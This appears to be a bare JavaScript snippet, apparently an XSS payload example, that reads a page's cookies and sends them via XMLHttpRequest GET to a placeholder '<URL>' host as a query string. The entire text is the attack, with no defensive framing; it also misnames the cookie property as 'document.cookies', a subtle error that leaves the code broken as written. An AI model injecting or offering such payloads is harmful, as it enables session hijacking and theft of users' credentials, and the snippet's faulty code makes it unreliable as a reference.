// GET
var cookies = document.cookies;
var xhr = new XMLHttpRequest();
xhr.open("GET", "<URL>/?cookies=" + encodeURIComponent(cookies), true);
xhr.send();